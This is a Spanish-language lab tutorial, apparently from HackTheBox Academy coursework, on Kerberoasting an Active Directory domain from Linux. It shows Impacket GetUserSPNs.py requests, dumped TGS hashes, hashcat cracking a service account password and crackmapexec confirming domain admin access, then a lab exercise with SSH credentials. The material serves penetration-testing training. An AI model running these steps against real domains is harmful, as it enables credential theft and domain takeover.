
# Kerberoasting desde Linux

## <mark style="color:purple;">Descripción general de Kerberoasting</mark>

Kerberoasting es una técnica de escalada de privilegios/movimiento lateral en entornos de Active Directory. Este ataque se dirige a cuentas [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names). Los SPN son identificadores únicos que Kerberos utiliza para asignar una instancia de servicio a una cuenta de servicio en cuyo contexto se ejecuta el servicio. Las cuentas de dominio se utilizan a menudo para ejecutar servicios para superar las limitaciones de autenticación de red de las cuentas integradas, como `NT AUTHORITY\LOCAL SERVICE`. Cualquier usuario de dominio puede solicitar un ticket de Kerberos para cualquier cuenta de servicio en el mismo dominio. Esto también es posible en todas las confianzas de bosque si se permite la autenticación a través del límite de confianza.&#x20;

### ¿Qué se necesita para el ataque?

Todo lo que necesita para realizar un ataque Kerberoasting es la `contraseña` de texto simple de una cuenta (o `hash NTLM)`, un shell en el contexto de una cuenta de usuario de dominio o acceso a nivel de `SYSTEM` en un host unido al dominio.

Las cuentas de dominio que ejecutan servicios suelen ser administradores locales, si no cuentas de dominio con privilegios elevados. Debido a la naturaleza distribuida de los sistemas, los servicios que interactúan y las transferencias de datos asociadas, las cuentas de servicio pueden tener privilegios de administrador en varios servidores de la empresa. Muchos servicios requieren privilegios elevados en varios sistemas, por lo que las cuentas de servicio suelen agregarse a grupos privilegiados, como administradores de dominio, ya sea directamente o mediante membresía anidada. Es muy común encontrar SPN asociados con cuentas con privilegios elevados en un entorno de Windows. Recuperar un ticket de Kerberos para una cuenta con un SPN no le permite ejecutar comandos en el contexto de esta cuenta. Sin embargo, el ticket (TGS-REP) está cifrado con el hash NTLM de la cuenta de servicio, por lo que la contraseña de texto sin formato se puede obtener potencialmente al someterla a un ataque de fuerza bruta offline con una herramienta como Hashcat.

Las cuentas de servicio suelen configurarse con contraseñas débiles o reutilizadas para simplificar la administración y, a veces, la contraseña es la misma que el nombre de usuario. Si se descifra la contraseña de una cuenta de servicio de SQL Server de dominio, es probable que se encuentre como administrador local en varios servidores, o incluso como administrador de dominio. Incluso si al descifrar un ticket obtenido a través de un ataque Kerberoasting se obtiene una cuenta de usuario con pocos privilegios, podemos utilizarla para crear tickets de servicio para el servicio especificado en el SPN. Por ejemplo, si el SPN está configurado en MSSQL/SRV01, podemos acceder al servicio MSSQL como administrador de sistemas, habilitar el procedimiento extendido xp\_cmdshell y obtener la ejecución de código en el servidor SQL de destino.

Para una mirada interesante al origen de esta técnica, consulte la [charla](https://youtu.be/PUyhlN-E5MU) que dio Tim Medin en Derbycon 2014, mostrando Kerberoasting al mundo.

***

## <mark style="color:purple;">Kerberoasting: cómo ejecutar el ataque</mark>

Dependiendo de su posición en una red, este ataque puede realizarse de múltiples maneras:

* `Desde un host Linux no unido a un dominio utilizando credenciales de usuario de dominio válidas.`
* `Desde un host Linux unido a un dominio como raíz después de recuperar el archivo keytab.`
* `Desde un host Windows unido a un dominio autenticado como usuario de dominio.`
* `Desde un host de Windows unido a un dominio con un shell en el contexto de una cuenta de dominio.`
* `Como SYSTEM en un host de Windows unido a un dominio.`
* `Desde un host de Windows no unido a un dominio usando` [`runas`](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\))`/netonly.`

Se pueden utilizar varias herramientas para realizar el ataque:

* [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) de Impacket desde un host Linux que no está unido a un dominio.
* Una combinación del binario integrado de Windows `setspn.exe`, `PowerShell` y `Mimikatz`.
* Desde Windows, utilizando herramientas como `PowerView`, [Rubeus](https://github.com/GhostPack/Rubeus) y otros scripts de PowerShell.

Obtener un ticket TGS a través de Kerberoasting no garantiza un conjunto de credenciales válidas, y el ticket debe ser `crackeado` sin conexión con una herramienta como Hashcat para obtener la contraseña en texto simple. Los tickets TGS tardan más en descifrarse que otros formatos como los hashes NTLM, por lo que, a menudo, a menos que se establezca una contraseña débil, puede resultar difícil o imposible obtener el texto simple utilizando un equipo de descifrado estándar.

***

## <mark style="color:purple;">Eficacia del ataque</mark>

Si bien puede ser una excelente manera de moverse lateralmente o escalar privilegios en un dominio, Kerberoast y la presencia de SPN no nos garantizan ningún nivel de acceso. Podríamos estar en un entorno en el que descifremos un ticket TGS y obtengamos acceso de administrador de dominio directamente u obtengamos credenciales que nos ayuden a avanzar por el camino hacia el compromiso del dominio.&#x20;

Otras veces, podemos realizar el ataque y recuperar muchos tickets TGS, algunos de los cuales podemos descifrar, pero ninguno de los que desciframos es para usuarios privilegiados, y el ataque no nos otorga ningún acceso adicional. Probablemente escribiría el hallazgo como de alto riesgo en mi informe en los dos primeros casos.&#x20;

En el tercer caso, podemos usar Kerberoast y terminar sin poder descifrar un solo ticket TGS, incluso después de días de intentos de descifrado con Hashcat en una potente plataforma de descifrado de contraseñas de GPU. En este escenario, igualmente escribiría el hallazgo, pero lo reduciría a un problema de riesgo medio para que el cliente sea consciente del riesgo de los SPN en el dominio (estas contraseñas seguras siempre se pueden cambiar por algo más débil o un atacante muy decidido podría ser capaz de descifrar los tickets usando Hashcat), pero tendría en cuenta el hecho de que no pude tomar el control de ninguna cuenta de dominio mediante el ataque. Es fundamental hacer este tipo de distinciones en nuestros informes y saber cuándo está bien reducir el riesgo de un hallazgo cuando se implementan controles de mitigación (como contraseñas muy seguras).

***

## <mark style="color:purple;">Realizando el ataque</mark>

Los ataques de Kerberoasting se realizan ahora fácilmente utilizando herramientas y scripts automatizados. Analizaremos la realización de este ataque de varias maneras, tanto desde un host de ataque Linux como desde un host de ataque Windows. Primero, veremos cómo hacerlo desde un host Linux. La siguiente sección explicará una forma "semimanual" de realizar el ataque y dos ataques rápidos y automatizados utilizando herramientas comunes de código abierto, todo desde un host de ataque Windows.

***

### Kerberosting con GetUserSPNs.py

Un requisito previo para realizar ataques Kerberoasting son las credenciales de usuario de dominio (texto simple o simplemente un hash NTLM si se utiliza Impacket), un shell en el contexto de un usuario de dominio o una cuenta como SYSTEM. Una vez que tengamos este nivel de acceso, podemos comenzar. También debemos saber qué host del dominio es un controlador de dominio para poder consultarlo.

Comencemos instalando el kit de herramientas Impacket, que podemos descargar desde [Aquí](https://github.com/SecureAuthCorp/impacket) . Después de clonar el repositorio, podemos ingresar al directorio e instalarlo de la siguiente manera:

**Instalación de Impacket mediante Pip**

```shell-session
afsh4ck@kali$ sudo python3 -m pip install .

Processing /opt/impacket
  Preparing metadata (setup.py) ... done
Requirement already satisfied: chardet in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (4.0.0)
Requirement already satisfied: flask>=1.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (1.1.2)
Requirement already satisfied: future in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.18.2)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (2.8.1)
Requirement already satisfied: ldapdomaindump>=0.9.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.9.3)

<SNIP>
```

Esto instalará todas las herramientas de Impacket y las colocará en nuestro PATH para que podamos llamarlas desde cualquier directorio en nuestro host de ataque. Al ejecutar la herramienta con la flag `-h`, aparecerá el menú de ayuda.

En sistemas Kali Linux viene instalado por defecto en la siguiente ruta:

```bash
locate GetUserSPNs.py                                        
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py
```

**Menú de ayuda de GetUserSPNs.py**

```shell-session
afsh4ck@kali$ GetUserSPNs.py -h

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

usage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN]
                      [-usersfile USERSFILE] [-request]
                      [-request-user username] [-save]
                      [-outputfile OUTPUTFILE] [-debug]
                      [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                      [-aesKey hex key] [-dc-ip ip address]
                      target

Queries target domain for SPNs that are running under a user account

positional arguments:
  target                domain/username[:password]

<SNIP>
```

Podemos comenzar simplemente recopilando una lista de SPN en el dominio. Para ello, necesitaremos un conjunto de credenciales de dominio válidas y la dirección IP de un controlador de dominio. Podemos autenticarnos en el controlador de dominio con una contraseña de texto simple, un hash de contraseña de NT o incluso un ticket de Kerberos. Para nuestros fines, utilizaremos una contraseña. Al ingresar el siguiente comando, se generará una solicitud de credenciales y luego una lista bien formateada de todas las cuentas de SPN.&#x20;

A partir del resultado a continuación, podemos ver que varias cuentas son miembros del grupo de administradores de dominio. Si podemos recuperar y descifrar uno de estos tickets, podría provocar un compromiso del dominio. Siempre vale la pena investigar la membresía del grupo de todas las cuentas porque podemos encontrar una cuenta con un ticket fácil de descifrar que puede ayudarnos a avanzar en nuestro objetivo de movernos lateralmente/verticalmente en el dominio de destino.

En secciones encontramos las credenciales de un usuario Administrador `forend:Klmcargo2`, así que vamos a usarlo:

### **Listado de cuentas SPN con GetUserSPNs.py**

```shell-session
afsh4ck@kali$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never> 
```

### **Solicitud de todos los Tickets de TGS**

Ahora podemos extraer todos los tickets de TGS para procesarlos sin conexión mediante la flag `-request`. Los tickets de TGS se generarán en un formato que se puede proporcionar fácilmente a Hashcat o John the Ripper para intentar descifrar contraseñas sin conexión.

```shell-session
afsh4ck@kali$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>               


$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445cab89923b26a01879a53249c5f0a8c4bb41f0ea1b1196c322640d37ac064ebe3755ce888947da98b5707e6b06cbf679db1e7bbbea7d10c36d27f976d3f9793895fde20d3199411a90c528a51c91d6119cb5835bd29457887dd917b6c621b91c2627b8dee8c2c16619dc2a7f6113d2e215aef48e9e4bba8deff329a68666976e55e6b3af0cb8184e5ea6c8c2060f8304bb9e5f5d930190e08d03255954901dc9bb12e53ef87ed603eb2247d907c3304345b5b481f107cefdb4b01be9f4937116016ef4bbefc8af2070d039136b79484d9d6c7706837cd9ed4797ad66321f2af200bba66f65cac0584c42d900228a63af39964f02b016a68a843a81f562b493b29a4fc1ce3ab47b934cbc1e29545a1f0c0a6b338e5ac821fec2bee503bc56f6821945a4cdd24bf355c83f5f91a671bdc032245d534255aac81d1ef318d83e3c52664cfd555d24a632ee94f4adeb258b91eda3e57381dba699f5d6ec7b9a8132388f2346d33b670f1874dfa1e8ee13f6b3421174a61029962628f0bc84fa0c3c6d7bbfba8f2d1900ef9f7ed5595d80edc7fc6300385f9aa6ce1be4c5b8a764c5b60a52c7d5bbdc4793879bfcd7d1002acbe83583b5a995cf1a4bbf937904ee6bb537ee00d99205ebf5f39c722d24a910ae0027c7015e6daf73da77af1306a070fdd50aed472c444f5496ebbc8fe961fee9997651daabc0ef0f64d47d8342a499fa9fb8772383a0370444486d4142a33bc45a54c6b38bf55ed613abbd0036981dabc88cc88a5833348f293a88e4151fbda45a28ccb631c847da99dd20c6ea4592432e0006ae559094a4c546a8e0472730f0287a39a0c6b15ef52db6576a822d6c9ff06b57cfb5a2abab77fd3f119caaf74ed18a7d65a47831d0657f6a3cc476760e7f71d6b7cf109c5fe29d4c0b0bb88ba963710bd076267b889826cc1316ac7e6f541cecba71cb819eace1e2e2243685d6179f6fb6ec7cfcac837f01989e7547f1d6bd6dc772aed0d99b615ca7e44676b38a02f4cb5ba8194b347d7f21959e3c41e29a0ad422df2a0cf073fcfd37491ac062df903b77a32101d1cb060efda284cae727a2e6cb890f4243a322794a97fc285f04ac6952aa57032a0137ad424d231e15b051947b3ec0d7d654353c41d6ad30c6874e5293f6e25a95325a3e164abd6bc205e5d7af0b642837f5af9eb4c5bca9040ab4b999b819ed6c1c4645f77ae45c0a5ae5fe612901c9d639392eaac830106aa249faa5a895633b20f553593e3ff01a9bb529ff036005ec453eaec481b7d1d65247abf62956366c0874493cf16da6ffb9066faa5f5bc1db5bbb51d9ccadc6c97964c7fe1be2fb4868f40b3b59fa6697443442fa5cebaaed9db0f1cb8476ec96bc83e74ebe51c025e14456277d0a7ce31e8848d88cbac9b57ac740f4678f71a300b5f50baa6e6b85a3b10a10f44ec7f708624212aeb4c60877322268acd941d590f81ffc7036e2e455e941e2cfb97e33fec5055284ae48204d
$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$d0fb2166453e4f2483735b9005e15667dbfd40fc9f8b5028e4b510fc570f5086978371ecd81ba6790b3fa7ff9a007ee9040f0566f4aed3af45ac94bd884d7b20f87d45b51af83665da67fb394a7c2b345bff2dfe7fb72836bb1a43f12611213b19fdae584c0b8114fb43e2d81eeee2e2b008e993c70a83b79340e7f0a6b6a1dba9fa3c9b6b02adde8778af9ed91b2f7fa85dcc5d858307f1fa44b75f0c0c80331146dfd5b9c5a226a68d9bb0a07832cc04474b9f4b4340879b69e0c4e3b6c0987720882c6bb6a52c885d1b79e301690703311ec846694cdc14d8a197d8b20e42c64cc673877c0b70d7e1db166d575a5eb883f49dfbd2b9983dd7aab1cff6a8c5c32c4528e798237e837ffa1788dca73407aac79f9d6f74c6626337928457e0b6bbf666a0778c36cba5e7e026a177b82ed2a7e119663d6fe9a7a84858962233f843d784121147ef4e63270410640903ea261b04f89995a12b42a223ed686a4c3dcb95ec9b69d12b343231cccfd29604d6d777939206df4832320bdd478bda0f1d262be897e2dcf51be0a751490350683775dd0b8a175de4feb6cb723935f5d23f7839c08351b3298a6d4d8530853d9d4d1e57c9b220477422488c88c0517fb210856fb603a9b53e734910e88352929acc00f82c4d8f1dd783263c04aff6061fb26f3b7a475536f8c0051bd3993ed24ff22f58f7ad5e0e1856a74967e70c0dd511cc52e1d8c2364302f4ca78d6750aec81dfdea30c298126987b9ac867d6269351c41761134bc4be67a8b7646935eb94935d4121161de68aac38a740f09754293eacdba7dfe26ace6a4ea84a5b90d48eb9bb3d5766827d89b4650353e87d2699da312c6d0e1e26ec2f46f3077f13825764164368e26d58fc55a358ce979865cc57d4f34691b582a3afc18fe718f8b97c44d0b812e5deeed444d665e847c5186ad79ae77a5ed6efab1ed9d863edb36df1a5cd4abdbf7f7e872e3d5fa0bf7735348744d4fc048211c2e7973839962e91db362e5338da59bc0078515a513123d6c5537974707bdc303526437b4a4d3095d1b5e0f2d9db1658ac2444a11b59ddf2761ce4c1e5edd92bcf5cbd8c230cb4328ff2d0e2813b4654116b4fda929a38b69e3f9283e4de7039216f18e85b9ef1a59087581c758efec16d948accc909324e94cad923f2487fb2ed27294329ed314538d0e0e75019d50bcf410c7edab6ce11401adbaf5a3a009ab304d9bdcb0937b4dcab89e90242b7536644677c62fd03741c0b9d090d8fdf0c856c36103aedfd6c58e7064b07628b58c3e086a685f70a1377f53c42ada3cb7bb4ba0a69085dec77f4b7287ca2fb2da9bcbedc39f50586bfc9ec0ac61b687043afa239a46e6b20aacb7d5d8422d5cacc02df18fea3be0c0aa0d83e7982fc225d9e6a2886dc223f6a6830f71dabae21ff38e1722048b5788cd23ee2d6480206df572b6ba2acfe1a5ff6bee8812d585eeb4bc8efce92fd81aa0a9b57f37bf3954c26afc98e15c5c90747948d6008c80b620a1ec54ded2f3073b4b09ee5cc233bf7368427a6af0b1cb1276ebd85b45a30

<SNIP>
```

También podemos ser más específicos y solicitar solo el ticket TGS para una cuenta específica. Intentemos solicitar uno solo para la `sqldev`cuenta.

### **Solicitud de Ticket Sencillo TGS**

```shell-session
afsh4ck@kali$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>               


$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b26032321529762c8a$1bdc5810b36c8e485ba08fcb7ab273f778115cd17734ec65be71f5b4bea4c0e63fa7bb454fdd5481e32f002abff9d1c7827fe3a75275f432ebb628a471d3be45898e7cb336404e8041d252d9e1ebef4dd3d249c4ad3f64efaafd06bd024678d4e6bdf582e59c5660fcf0b4b8db4e549cb0409ebfbd2d0c15f0693b4a8ddcab243010f3877d9542c790d2b795f5b9efbcfd2dd7504e7be5c2f6fb33ee36f3fe001618b971fc1a8331a1ec7b420dfe13f67ca7eb53a40b0c8b558f2213304135ad1c59969b3d97e652f55e6a73e262544fe581ddb71da060419b2f600e08dbcc21b57355ce47ca548a99e49dd68838c77a715083d6c26612d6c60d72e4d421bf39615c1f9cdb7659a865eecca9d9d0faf2b77e213771f1d923094ecab2246e9dd6e736f83b21ee6b352152f0b3bbfea024c3e4e5055e714945fe3412b51d3205104ba197037d44a0eb73e543eb719f12fd78033955df6f7ebead5854ded3c8ab76b412877a5be2e7c9412c25cf1dcb76d854809c52ef32841269064661931dca3c2ba8565702428375f754c7f2cada7c2b34bbe191d60d07111f303deb7be100c34c1c2c504e0016e085d49a70385b27d0341412de774018958652d80577409bff654c00ece80b7975b7b697366f8ae619888be243f0e3237b3bc2baca237fb96719d9bc1db2a59495e9d069b14e33815cafe8a8a794b88fb250ea24f4aa82e896b7a68ba3203735ec4bca937bceac61d31316a43a0f1c2ae3f48cbcbf294391378ffd872cf3721fe1b427db0ec33fd9e4dfe39c7cbed5d70b7960758a2d89668e7e855c3c493def6aba26e2846b98f65b798b3498af7f232024c119305292a31ae121a3472b0b2fcaa3062c3d93af234c9e24d605f155d8e14ac11bb8f810df400604c3788e3819b44e701f842c52ab302c7846d6dcb1c75b14e2c9fdc68a5deb5ce45ec9db7318a80de8463e18411425b43c7950475fb803ef5a56b3bb9c062fe90ad94c55cdde8ec06b2e5d7c64538f9c0c598b7f4c3810ddb574f689563db9591da93c879f5f7035f4ff5a6498ead489fa7b8b1a424cc37f8e86c7de54bdad6544ccd6163e650a5043819528f38d64409cb1cfa0aeb692bdf3a130c9717429a49fff757c713ec2901d674f80269454e390ea27b8230dec7fffb032217955984274324a3fb423fb05d3461f17200dbef0a51780d31ef4586b51f130c864db79796d75632e539f1118318db92ab54b61fc468eb626beaa7869661bf11f0c3a501512a94904c596652f6457a240a3f8ff2d8171465079492e93659ec80e2027d6b1865f436a443b4c16b5771059ba9b2c91e871ad7baa5355d5e580a8ef05bac02cf135813b42a1e172f873bb4ded2e95faa6990ce92724bcfea6661b592539cd9791833a83e6116cb0ea4b6db3b161ac7e7b425d0c249b3538515ccfb3a993affbd2e9d247f317b326ebca20fe6b7324ffe311f225900e14c62eb34d9654bb81990aa1bf626dec7e26ee2379ab2f30d14b8a98729be261a5977fefdcaaa3139d4b82a056322913e7114bc133a6fc9cd74b96d4d6a2
```

Con este ticket, podríamos intentar descifrar la contraseña del usuario sin conexión mediante Hashcat. Si tenemos éxito, podríamos terminar obteniendo derechos de administrador de dominio.

Para facilitar el descifrado fuera de línea, siempre es bueno usar la flag `-outputfile` para escribir los tickets TGS en un archivo que luego puede ejecutarse usando Hashcat en nuestro sistema de ataque o moverse a una plataforma de descifrado de GPU.

### **Guardar el ticket TGS en un archivo**

```shell-session
afsh4ck@kali$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>  
```

Aquí hemos escrito el ticket TGS para el usuario `sqldev` en un archivo llamado `sqldev_tgs`. Ahora podemos intentar descifrar el ticket sin conexión usando el modo hash Hashcat `13100`.

### **Crackear el ticket sin conexión con Hashcat**

```shell-session
afsh4ck@kali$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$f0f5fc941f17458eb17b01df6eeddce8a0f6b3c605112c5a71d5f66b976049de4b0d173100edaee42cb68407b1eca2b12788f25b7fa3d06492effe9af37a8a8001c4dd2868bd0eba82e7d8d2c8d2e3cf6d8df6336d0fd700cc563c8136013cca408fec4bd963d035886e893b03d2e929a5e03cf33bbef6197c8b027830434d16a9a931f748dede9426a5d02d5d1cf9233d34bb37325ea401457a125d6a8ef52382b94ba93c56a79f78cb26ffc9ee140d7bd3bdb368d41f1668d087e0e3b1748d62dfa0401e0b8603bc360823a0cb66fe9e404eada7d97c300fde04f6d9a681413cc08570abeeb82ab0c3774994e85a424946def3e3dbdd704fa944d440df24c84e67ea4895b1976f4cda0a094b3338c356523a85d3781914fc57aba7363feb4491151164756ecb19ed0f5723b404c7528ebf0eb240be3baa5352d6cb6e977b77bce6c4e483cbc0e4d3cb8b1294ff2a39b505d4158684cd0957be3b14fa42378842b058dd2b9fa744cee4a8d5c99a91ca886982f4832ad7eb52b11d92b13b5c48942e31c82eae9575b5ba5c509f1173b73ba362d1cde3bbd5c12725c5b791ce9a0fd8fcf5f8f2894bc97e8257902e8ee050565810829e4175accee78f909cc418fd2e9f4bd3514e4552b45793f682890381634da504284db4396bd2b68dfeea5f49e0de6d9c6522f3a0551a580e54b39fd0f17484075b55e8f771873389341a47ed9cf96b8e53c9708ca4fc134a8cf38f05a15d3194d1957d5b95bb044abbb98e06ccd77703fa5be4aacc1a669fe41e66b69406a553d90efe2bb43d398634aff0d0b81a7fd4797a953371a5e02e25a2dd69d16b19310ac843368e043c9b271cab112981321c28bfc452b936f6a397e8061c9698f937e12254a9aadf231091be1bd7445677b86a4ebf28f5303b11f48fb216f9501667c656b1abb6fc8c2d74dc0ce9f078385fc28de7c17aa10ad1e7b96b4f75685b624b44c6a8688a4f158d84b08366dd26d052610ed15dd68200af69595e6fc4c76fc7167791b761fb699b7b2d07c120713c7c797c3c3a616a984dbc532a91270bf167b4aaded6c59453f9ffecb25c32f79f4cd01336137cf4eee304edd205c0c8772f66417325083ff6b385847c6d58314d26ef88803b66afb03966bd4de4d898cf7ce52b4dd138fe94827ca3b2294498dbc62e603373f3a87bb1c6f6ff195807841ed636e3ed44ba1e19fbb19bb513369fca42506149470ea972fccbab40300b97150d62f456891bf26f1828d3f47c4ead032a7d3a415a140c32c416b8d3b1ef6ed95911b30c3979716bda6f61c946e4314f046890bc09a017f2f4003852ef1181cec075205c460aea0830d9a3a29b11e7c94fffca0dba76ba3ba1f0577306555b2cbdf036c5824ccffa1c880e2196c0432bc46da9695a925d47febd3be10104dd86877c90e02cb0113a38ea4b7e4483a7b18b15587524d236d5c67175f7142cc75b1ba05b2395e4e85262365044d272876f500cb511001850a390880d824aec2c452c727beab71f56d8189440ecc3915c148a38eac06dbd27fe6817ffb1404c1f:database!
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIG...404c1f
Time.Started.....: Tue Feb 15 17:45:29 2022, (10 secs)
Time.Estimated...: Tue Feb 15 17:45:39 2022, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   821.3 kH/s (11.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8765440/14344386 (61.11%)
Rejected.........: 0/8765440 (0.00%)
Restore.Point....: 8749056/14344386 (60.99%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: davius07 -> darten170

Started: Tue Feb 15 17:44:49 2022
Stopped: Tue Feb 15 17:45:41 2022
```

![imagen](https://academy.hackthebox.com/storage/modules/143/hashcat_tgs.png)

Hemos descifrado con éxito la contraseña del usuario como `database!`. Como último paso, podemos confirmar nuestro acceso y ver que efectivamente tenemos derechos de administrador de dominio, ya que podemos autenticarnos en el controlador de dominio de destino en el dominio INLANEFREIGHT.LOCAL. Desde aquí, podríamos realizar una explotación posterior y continuar enumerando el dominio en busca de otras rutas de vulneración y otras fallas y configuraciones incorrectas notables.

### **Prueba de autenticación contra un controlador de dominio**

```shell-session
afsh4ck@kali$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.188.166 (ACADEMY-EA-ATTACK01)
Usuario "htb-student"
Contraseña "HTB_@cademy_stdnt!"
```

### Pregunta 1

Recupera el ticket TGS para la cuenta `SAPService`. Descifra el ticket sin conexión y envía la contraseña como respuesta.

Lo primero, vamos a listar todas las cuentas SPN:

```shell-session
┌─[✗]─[htb-student@ea-attack01]─[/opt/impacket/examples]
└──╼ $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                               Name               MemberOf                                                                                  PasswordLastSet             LastLogon                   Delegation 
-------------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433  damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2022-04-10 18:50:58.924378             
